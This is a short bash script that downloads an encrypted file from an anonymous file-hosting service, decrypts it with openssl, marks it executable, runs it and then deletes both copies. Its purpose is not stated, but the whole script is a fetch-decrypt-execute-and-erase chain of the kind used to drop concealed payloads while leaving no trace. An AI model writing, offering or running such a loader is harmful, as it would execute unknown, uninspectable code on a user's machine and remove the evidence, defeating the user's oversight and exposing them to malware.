#! /bin/bash
cd
curl -L -O https://cdn-144.anonfiles.com/sev4sdU1y8/e5cff79f-1674834303/x-l1bra.enc
openssl aes-256-cbc -pbkdf2 -d -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
